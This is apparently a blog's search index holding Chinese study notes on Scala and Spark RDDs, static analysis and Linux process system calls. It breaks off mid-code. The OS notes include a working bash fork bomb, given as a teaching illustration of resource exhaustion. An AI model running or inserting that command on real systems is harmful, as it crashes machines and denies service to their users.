<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BigData1-Scala</title>
      <link href="/2022/09/25/BigData1-Scala/"/>
      <url>/2022/09/25/BigData1-Scala/</url>
      
        <content type="html"><![CDATA[<h2 id="1-和Java-进行交互"><a class="header-anchor" href="#1-和Java-进行交互">¶</a>1.和Java 进行交互</h2><p>在 Scala 程序中，java.lang包下的类是默认全部引入的，其它包下的类则需要显式(explicitly)引入，且Scala 可以和 Java 进行无缝(seemlessly)的交互操作。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.&#123;<span class="type">Date</span>, <span class="type">Locale</span>&#125;</span><br><span class="line"><span class="keyword">import</span> java.text.<span class="type">DateFormat</span></span><br><span class="line"><span class="keyword">import</span> java.text.<span class="type">DateFormat</span>._ <span class="comment">//scala中*是合法标识符，_代表所有</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">FrenchDate</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]) &#123;</span><br><span class="line">    <span class="keyword">val</span> now = <span class="keyword">new</span> <span class="type">Date</span></span><br><span class="line">    <span class="keyword">val</span> df = getDateInstance(<span class="type">LONG</span>, <span class="type">Locale</span>.<span class="type">FRANCE</span>) println(df format now)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>df format now是一个语法特性，如果一个方法只接受一个参数，那么可以使用 infix 语法，和 df.format(now)的语义完全相同</p><h2 id="2-函数是对象"><a class="header-anchor" href="#2-函数是对象">¶</a>2.函数是对象</h2><p>Scala 中，函数(functions)也是对象(objects)，所以，函数可以当做参数进行传递，可以把函数存储在变量中，也可以把函数作为其他函数的返回值。这种将函数当做值进行操作的能力，是函数式编程（functional programming）最重要的特性之一。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Timer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">oncePerSecond</span></span>(callback: () =&gt; <span class="type">Unit</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123; callback(); <span class="type">Thread</span> sleep <span class="number">1000</span> &#125; &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">timeFlies</span></span>() &#123;println(<span class="string">&quot;time flies like an arrow...&quot;</span>)&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]) &#123;oncePerSecond(timeFlies)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序实现了简单定时器的功能，负责定时的函数（function）名为：oncePerSecond，它接受一个回调函数作为参数，该回调函数的类型记为：() =&gt; Unit，代表任何无参数、无返回值的函数（Unit和 C/C++中的 void类似）。程序的 main 方法调用定时函数，作为实参传进去的回调函数 timeFlies，仅仅向终端打印一句话，所以，该程序的实际功能是：每秒钟在屏幕上打印一条信息：time ﬂies like an arrow。</p><h3 id="匿名函数"><a class="header-anchor" href="#匿名函数">¶</a>匿名函数</h3><p>这里的timeFlies函数只被用过一次，也就是当做回调函数传给 oncePerSecond的时候，对于这种函数，在用到的时候即时构造更合理，因为可以省去定义和命名的麻烦，在 Scala 中，这样的函数称为匿名函数（anonymous functions），也就是没有名字的函数。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]) &#123;</span><br><span class="line">    oncePerSecond(() =&gt;</span><br><span class="line">        println(<span class="string">&quot;time flies like an arrow...&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中的右箭头‘=&gt;’表明程序中存在一个匿名函数，箭头左边是匿名函数的参数列表，右边是函数体。在本例中，参数列表为空(箭头左边是一对空括号)，而函数体和改造前定义的 timeFlies 函数保持一致。</p><h2 id="3-类"><a class="header-anchor" href="#3-类">¶</a>3.类</h2><p>与java不同的是，Scala中的类定义可以带参数。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span>(<span class="params">real: <span class="type">Double</span>, imaginary: <span class="type">Double</span></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">re</span></span>() = real  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">im</span></span>() = imaginary</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="无参方法"><a class="header-anchor" href="#无参方法">¶</a>无参方法</h3><p>无参方法像访问类属性（fields）一样访问类的方法，使程序更加简洁；和零参方法的差异在于：无参方法在声明和调用时，均无须在方法名后面加括号。<code>def re = real</code></p><h3 id="继承和方法重写"><a class="header-anchor" href="#继承和方法重写">¶</a>继承和方法重写</h3><p>Scala 中重写（overriding）从父类继承的方法，必须使用 override修饰符来显式声明</p><p><code>override def toString() = &quot;&quot; +re + (if (im &lt; 0) &quot;&quot; else &quot;+&quot;) + im + &quot;i&quot;</code></p><h2 id="4-条件类和模式匹配"><a class="header-anchor" href="#4-条件类和模式匹配">¶</a>4.条件类和模式匹配</h2><h3 id="条件类的引入"><a class="header-anchor" href="#条件类的引入">¶</a>条件类的引入</h3><p>在 Java 中，建立树形结构最常见的做法是：创建一个表示树的抽象类，然后每<br>种类型的节点用一个继承自抽象类的子类来表示。而在函数式编程语言中，则可以使用<br>代数数据类型（algebraic data-type）来达到同样的目的。Scala 则提供了一种介于两者之间（类继承和代数数据类型），被称为条件类（case classes）的概念，下面就是用条件类定义树的示例代码：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Sum</span>(<span class="params">l: <span class="type">Tree</span>, r: <span class="type">Tree</span></span>) <span class="keyword">extends</span> <span class="title">Tree</span>  <span class="title">case</span> <span class="title">class</span> <span class="title">Var</span>(<span class="params">n: <span class="type">String</span></span>) <span class="keyword">extends</span> <span class="title">Tree</span></span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Const</span>(<span class="params">v: <span class="type">Int</span></span>) <span class="keyword">extends</span> <span class="title">Tree</span></span></span><br></pre></td></tr></table></figure><p>上例中的Sum, Var和Const就是条件类，它们与普通类的差异主要体现在如下几个方面：</p><ul><li><p>新建条件类的实例，无须使用new关键字</p></li><li><p>自动为构造函数所带的参数创建对应的 getter 方法（也就是说，如果 c是 Const的实例，通过 c.v即可访问构造函数中的同名参数v的值）</p></li><li><p>条件类都默认实现equals 、hashCode和toString方法，与java的同名默认实现基本相同</p></li><li><p>条件类的实例可以通过模式匹配进行分解</p></li></ul><h3 id="例子：算术式求值"><a class="header-anchor" href="#例子：算术式求值">¶</a>例子：算术式求值</h3><p>既然我们已经定义了用于表示算术表达式的数据结构，接下来我们可以定义作用在这<br>些数据结构上的操作。首先，我们定义一个在特定环境（environment，上下文）中对表达式进行求值的函数，其中环境的作用是为了确定表达式中的变量的取值。例如：<br>有一个环境，对变量 x 的赋值为 5，我们记为：{x → 5}，那么，在这个环境上求 x + 1的值，得到的结果为 6。</p><p>在程序中，环境也需要一种合理的方式来表示。可以使用哈希表（hash table）之类的数据结构，也可以直接使用函数（functions）！实际上，环境就是一个给变量赋予特定值的函数。上面提到的环境：{x → 5}，在 Scala 中可以写成：<code>&#123; case &quot;x&quot; =&gt; 5 &#125;</code></p><p>上面这一行代码定义了一个函数，如果给该函数传入一个字符串&quot;x&quot;作为参数，则函数返回整数 5，否则，将抛出异常。同理，定义一个将字符串转为整数的环境可以简化代码，<code>type Environment = String =&gt; Int</code></p><p>求值函数：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eval</span></span>(t: <span class="type">Tree</span>, env: <span class="type">Environment</span>): <span class="type">Int</span> = t <span class="keyword">match</span> &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="type">Sum</span>(l, r) =&gt; eval(l, env) + eval(r, env) <span class="keyword">case</span> <span class="type">Var</span>(n) =&gt; env(n)  </span><br><span class="line"><span class="keyword">case</span> <span class="type">Const</span>(v) =&gt; v</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模式匹配的过程，实际上就是把一个值和一系列的模式进行比对，如果能够匹配上，则从值中取出有用的部分进行命名，然后用这些命名的部分（作为参数）来驱动另一段代码的执行。</p><p>“模式匹配”和“类方法”除了编程风格的差异，也各有利弊，决策者需要根据程序的扩展性需求做出权衡和选择：</p><ul><li><p>使用类方法，添加一种节点类型比较简单，新增一种操作比较麻烦，因为要修改所有子类</p></li><li><p>使用模式匹配，新增节点类型需要修改所有操作函数，而增加新的操作则只需要增加新的函数</p></li></ul><h2 id="5-Traits（特性）-和Genericity（泛型）"><a class="header-anchor" href="#5-Traits（特性）-和Genericity（泛型）">¶</a>5.Traits（特性） 和Genericity（泛型）</h2><p>traits可以理解为java中的接口；Genericity即模板。</p><p><code>class Ref[T] &#123;var contents: T = _&#125;</code></p><p>这里赋给变量的初始值_代表各种类型的默认值。</p><h2 id="6-RDD"><a class="header-anchor" href="#6-RDD">¶</a>6.RDD</h2><p>RDD（Resilient Distributed Dataset弹性分布式数据集）是Spark中抽象的数据结构类型，任何数据在Spark中都被表示为RDD。从编程的角度来看，RDD可以简单看成是一个数组。和普通数组的区别是，RDD中的数据时分区存储的，这样不同分区的数据就可以分布在不同的机器上，同时可以被并行处理。因此，Spark应用程序所做的无非是把需要处理的数据转换为RDD，然后对RDD进行一系列的变换和操作，从而得到结果。</p><h3 id="1-创建"><a class="header-anchor" href="#1-创建">¶</a>1.创建</h3><p>RDD可以从普通数组创建出来，也可以从文件系统或者HDFS中的文件创建出来。</p><ol><li>从普通数组创建RDD，里面包含了1到9这9个数字，它们分别在3个分区中</li></ol><p><code>scala&gt; val a = sc.parallelize(1 to 9, 3)</code></p><ol start="2"><li>读取文件README.md来创建RDD，文件中的每一行就是RDD中的一个元素</li></ol><p><code>scala&gt; val b = sc.textFile(&quot;README.md&quot;)</code></p><h3 id="2-两类操作算子"><a class="header-anchor" href="#2-两类操作算子">¶</a>2.两类操作算子</h3><p>主要分两类，转换（transformation）和动作（action）。两类函数的主要区别是，transformation接受RDD并返回RDD，而action接受RDD返回非RDD.</p><p>transformation操作是延迟计算的，也就是说从一个RDD生成另一个RDD的转换操作不是马上执行，需要等到有action操作的时候才真正触发运算。</p><h3 id="3-部分转换算子"><a class="header-anchor" href="#3-部分转换算子">¶</a>3.部分转换算子</h3><h4 id="map"><a class="header-anchor" href="#map">¶</a>map</h4><p>对RDD中的每个元素都执行一个<strong>指定的函数</strong>来产生一个<strong>新的</strong>RDD。任何原RDD中的元素在新RDD中都有且只有一个元素与之对应。</p><p>举例：</p><p>scala&gt; val a = sc.parallelize(1 to 9, 3)</p><p>scala&gt; val b = a.map(x =&gt; x*2)</p><p>scala&gt; a.collect</p><p>res10: Array[Int] = Array(1, 2, 3, 4, 5, 6, 7, 8, 9)</p><p>scala&gt; b.collect</p><p>res11: Array[Int] = Array(2, 4, 6, 8, 10, 12, 14, 16, 18)</p><h4 id="flatMap"><a class="header-anchor" href="#flatMap">¶</a>flatMap</h4><p>与map类似，区别是原RDD中的元素经map处理后只能生成一个元素，而原RDD中的元素经flatmap处理后可生成多个元素来构建新RDD。</p><p>举例：对原RDD中的每个元素x产生y个元素（从1到y，y为元素x的值）</p><p>scala&gt; val a = sc.parallelize(1 to 4, 2)</p><p>scala&gt; val b = a.flatMap(x =&gt; 1 to x)</p><p>scala&gt; b.collect</p><p>res12: Array[Int] = Array(1, 1, 2, 1, 2, 3, 1, 2, 3, 4,1,2,3,4)</p><h4 id="mapWith"><a class="header-anchor" href="#mapWith">¶</a>mapWith</h4><p>是map的一个变种，map只需要一个输入函数，而mapWith有两个输入函数。它的定义如下：</p><p><code>def mapWith[A: ClassTag, U: ](constructA: Int =&gt; A, preservesPartitioning: Boolean = false)(f: (T, A) =&gt; U): RDD[U]</code></p><p>第一个函数constructA是把RDD的partition index（index从0开始）作为输入，输出为新类型A；</p><p>第二个函数f是把二元组(T, A)作为输入（其中T为原RDD中的元素，A为第一个函数的输出），输出类型为U。</p><p>举例：把partition index 乘以10，然后加上2作为新的RDD的元素。</p><p>val x = sc.parallelize(List(1,2,3,4,5,6,7,8,9,10), 3)</p><p>x.mapWith(a =&gt; a * 10)((a, b) =&gt; (b + 2)).collect</p><p>res4: Array[Int] = Array(2, 2, 2, 12, 12, 12, 22, 22, 22, 22)</p><h4 id="union，"><a class="header-anchor" href="#union，">¶</a>union，++</h4><p>将两个RDD中元素直接作为新RDD的元素</p><p>1,2,3++4,5,6：1,2,3,4,5,6</p><p>对比<code>zip</code>：将两个RDD元素两两组合成tuple，作为新RDD的元素</p><p>1,2,3 zip 4,5,6：(1,4),(2,5)(3,6)</p><h3 id="4-部分action算子"><a class="header-anchor" href="#4-部分action算子">¶</a>4.部分action算子</h3><h4 id="collect"><a class="header-anchor" href="#collect">¶</a>collect</h4><p>将数据集的所有元素作为驱动程序中的数组返回，在返回足够小的数据子集的过滤器或其他操作时很有用</p><h4 id="foreach-func"><a class="header-anchor" href="#foreach-func">¶</a>foreach(func)</h4><p>在数据集的每个元素上运行函数func</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BigData </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SPA-01</title>
      <link href="/2022/09/15/SPA-01/"/>
      <url>/2022/09/15/SPA-01/</url>
      
        <content type="html"><![CDATA[<p>由于现代程序的日渐复杂大规模，，程序的可靠性也需要理论支持。程序分析成为PL（Programming Language）领域最有活力的方向之一，在程序可靠性、程序安全、编译器优化、程序理解等方面有着很多应用。</p><h1>静态分析</h1><p>静态分析在运行一个程序之前，分析它的行为以及判断是否满足一些属性。</p><h2 id="Rice’s-Theorem"><a class="header-anchor" href="#Rice’s-Theorem">¶</a>Rice’s Theorem</h2><p>“Any non-trivial property of the behavior of programs in a r.e. language is undecidable.（递归可枚举语言的任何非平凡的性质，都是不可判定的。）</p><blockquote><p>r.e. (recursively enumerable) = recognizable by a Turing-machine</p><p>trivial properties 所有程序都有或都没有的性质<br>non-trivial properties</p><p>~= interesting properties<br>~= the properties related with run-time behaviors of program，如内存泄漏，可优化性</p></blockquote><h3 id="Perfect-static-analysis不存在"><a class="header-anchor" href="#Perfect-static-analysis不存在">¶</a>Perfect static analysis不存在</h3><p>Perfect：Sound AND Complete</p><p><img src="https://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/image-20200802115612020.png" alt></p><h2 id="Necessity-of-Soundness"><a class="header-anchor" href="#Necessity-of-Soundness">¶</a>Necessity of Soundness</h2><p>当程序可能出现bug时，我们都应该能够报告错误，即使某些路径上程序可能是正确的</p><p><strong>ensure (or get close to) soundness, while making good trade-offs between analysis precision and analysis speed</strong></p><h2 id="Abstraction-and-Over-approximation"><a class="header-anchor" href="#Abstraction-and-Over-approximation">¶</a>Abstraction and Over-approximation</h2>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jyyOS-3</title>
      <link href="/2022/09/11/jyyOS-3/"/>
      <url>/2022/09/11/jyyOS-3/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-操作系统启动流程"><a class="header-anchor" href="#Linux-操作系统启动流程">¶</a>Linux 操作系统启动流程</h2><p>CPU Reset → Firmware → Loader → Kernel <code>_start()</code> → 第一个程序 <code>/bin/init</code> → 程序 (状态机) 执行 + 系统调用syscal</p><p>操作系统会加载 “第一个程序”</p><ul><li>RTFSC(latest Linux Kernel)<ul><li>如果没有指定启动选项 <code>init=</code>，按照 “默认列表” 尝试一遍</li><li>从此以后，Linux Kernel 就进入后台，成为 “中断/异常处理程序”</li></ul></li></ul><h3 id="操作系统为-所有-程序提供-API"><a class="header-anchor" href="#操作系统为-所有-程序提供-API">¶</a>操作系统为 (所有) 程序提供 API</h3><ul><li>进程 (状态机) 管理<ul><li>fork, execve, exit - 状态机的创建/改变/删除 ← 今天的主题</li></ul></li><li>存储 (地址空间) 管理<ul><li>mmap - 虚拟地址空间管理</li></ul></li><li>文件 (数据对象) 管理<ul><li>open, close, read, write - 文件访问管理</li><li>mkdir, link, unlink - 目录管理</li></ul></li></ul><h1>进程（状态机）管理</h1><p>虚拟化：操作系统在物理内存中保存多个状态机</p><ul><li>通过虚拟内存实现每次 “拿出来一个执行”</li><li>中断后进入操作系统代码，“换一个执行”</li></ul><h2 id="创建状态机：fork"><a class="header-anchor" href="#创建状态机：fork">¶</a>创建状态机：fork</h2><p><code>int fork();</code></p><ul><li>立即复制状态机 (完整的内存)</li><li>新创建进程返回 0</li><li>执行 fork 的进程返回子进程的进程号</li></ul><h3 id="Fork-Bomb"><a class="header-anchor" href="#Fork-Bomb">¶</a>Fork Bomb</h3><p>模拟状态机需要资源——只要不停地创建进程，系统还是会挂掉的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:()&#123;:|:&amp;&#125;;:   <span class="comment"># 刚才的一行版本</span></span><br><span class="line"></span><br><span class="line">:() &#123;         <span class="comment"># 格式化一下</span></span><br><span class="line">  : | : &amp;</span><br><span class="line">&#125;; :</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">fork</span></span>() &#123;      <span class="comment"># bash: 允许冒号作为标识符……</span></span><br><span class="line">  fork | fork &amp;</span><br><span class="line">&#125;; fork</span><br></pre></td></tr></table></figure><h3 id="例子"><a class="header-anchor" href="#例子">¶</a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>./a.out</code> v.s. <code>./a.out | cat</code>，会看到结果并不相同</p><p>原因：printf在终端输出时，会先存在LineBuffer，直到遇到\n等。输出至文件时，会存在FullBuffer，满一定额输出。fork时缓存也被复制了。</p><ul><li><p>i=0，fork</p></li><li><p>i=0，printf ×2</p></li><li><p>i=1，fork    Hello\n ×2</p></li><li><p>i=1，printf    Hello\n ×4</p></li><li><p>i=2，结束    Hello\nHello\n ×4</p></li></ul><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc = fork();</span><br><span class="line">  <span class="keyword">if</span>(rc&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>); <span class="comment">//这些用于检测异常情况</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (rc==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;this is child process\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;this is parent process\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​ 如果在单CPU的系统上运行上面这段程序，程序所输出的结果是不确定的，有可能先输出 this is parent process，也有可能先输出 this is child process，因为在 int rc = fork(); 这行代码执行完之后，父进程和新创建的子进程就是操作系统当中<strong>并发的两个不同的进程</strong>了，他们两个谁先运行并输出信息就要取决于CPU调度程序了。</p><h3 id="wait-系统调用"><a class="header-anchor" href="#wait-系统调用">¶</a>wait()系统调用</h3><p>​ 父进程在使用fork()创建完子进程之后，可以执行wait()系统调用，或者是更完整的waitpid()接口，从而延迟自己的执行，直到子进程执行完，如果将上面fork()系统调用中的举例使用的代码进行部分修改，改为下面这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc = fork();</span><br><span class="line">  <span class="keyword">if</span>(rc&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (rc==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;this is child process\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> wc = wait(<span class="literal">NULL</span>);  <span class="comment">//这一句代码是新添加的，父进程通过wait()等待子进程结束之后自己才继续执行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this is parent process\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这样，输出的结果就总是 this is child process 这句话先输出了，哪怕调度算法让父进程先于子进程执行，父进程执行到wait()处时，便会停止执行，开始等待，直至子进程运行结束。</p><h2 id="替换状态机：execve"><a class="header-anchor" href="#替换状态机：execve">¶</a>替换状态机：execve</h2><p>将当前运行的状态机重置成成另一个程序的初始状态</p><p><code>int execve(const char *filename, char * const argv, char * const envp);</code></p><ul><li>执行名为 <code>filename</code> 的程序</li><li>允许对新状态机设置参数 <code>argv</code> (v) 和环境变量 <code>envp</code> (e)</li></ul><h3 id="环境变量"><a class="header-anchor" href="#环境变量">¶</a>环境变量</h3><p>“应用程序执行的环境”</p><ul><li>使用 <code>env</code> 命令查看<ul><li><code>PATH</code>: 可执行文件搜索路径</li><li><code>PWD</code>: 当前路径</li><li><code>HOME</code>: home 目录</li><li><code>DISPLAY</code>: 图形输出</li><li><code>PS1</code>: shell 的提示符</li></ul></li><li><code>export</code>: 告诉 shell 在创建子进程时设置环境变量</li></ul><h2 id="终止状态机：-exit"><a class="header-anchor" href="#终止状态机：-exit">¶</a>终止状态机：_exit</h2><p>立即摧毁状态机，<code>void _exit(int status)</code></p><p>销毁当前状态机，并允许有一个返回值</p><h3 id="结束程序执行的三种方法"><a class="header-anchor" href="#结束程序执行的三种方法">¶</a>结束程序执行的三种方法</h3><p>exit 的几种写法 (它们是不同)</p><ul><li><code>exit(0)</code> - <code>stdlib.h</code> 中声明的 libc 函数<ul><li>会调用 <code>atexit</code></li></ul></li><li><code>_exit(0)</code> - glibc 的 syscall wrapper<ul><li>执行 “<code>exit_group</code>” 系统调用终止整个进程 (所有线程)<ul><li>细心的同学已经在 strace 中发现了</li></ul></li><li>不会调用 <code>atexit</code></li></ul></li><li><code>syscall(SYS_exit, 0)</code><ul><li>执行 “<code>exit</code>” 系统调用终止当前线程</li><li>不会调用 <code>atexit</code></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jyyOS-1</title>
      <link href="/2022/09/08/jyyOS-1/"/>
      <url>/2022/09/08/jyyOS-1/</url>
      
        <content type="html"><![CDATA[<h1>源代码程序是状态机</h1><ul><li>状态 = 堆 + 栈</li><li>初始状态 = <code>main</code> 的第一条语句</li><li>迁移 = 执行一条简单语句<ul><li>任何 C 程序都可以改写成 “非复合语句” 的 C 代码</li></ul></li></ul><h2 id="C程序的语义"><a class="header-anchor" href="#C程序的语义">¶</a>C程序的语义</h2><ul><li>状态 = stack frame 的列表 (每个 frame 有 PC) + 全局变量</li><li>初始状态 = main(argc, argv), 全局变量初始化</li><li>迁移 = 执行 top stack frame PC 的语句; PC++<ul><li>函数调用 = push frame (frame.PC = 入口)</li><li>函数返回 = pop frame</li></ul></li></ul><p>非递归汉诺塔：switch模拟状态机，把不同状态的frame放入call中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  u32 pc, n;</span><br><span class="line">  <span class="keyword">char</span> from, to, via;</span><br><span class="line">&#125; Frame;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> call(...) (&#123; *(++top) = (Frame) &#123; .pc = 0, __VA_ARGS__ &#125;; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret()     